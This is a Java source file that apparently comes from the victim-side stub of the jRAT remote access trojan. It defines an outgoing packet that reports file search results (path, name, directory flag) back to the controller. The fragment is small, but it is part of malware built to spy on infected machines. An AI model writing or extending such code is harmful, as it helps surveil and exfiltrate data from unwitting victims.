package su.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import su.jrat.common.io.StringWriter;


public class Packet37SearchResult extends AbstractOutgoingPacket {

	private String absolutePath;
	private String name;
	private boolean directory;

	public Packet37SearchResult(String absolutePath, String name, boolean directory) {
		this.absolutePath = absolutePath;
		this.name = name;
		this.directory = directory;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(absolutePath);
		sw.writeLine(name);
		dos.writeBoolean(directory);
	}

	@Override
	public byte getPacketId() {
		return 37;
	}

}
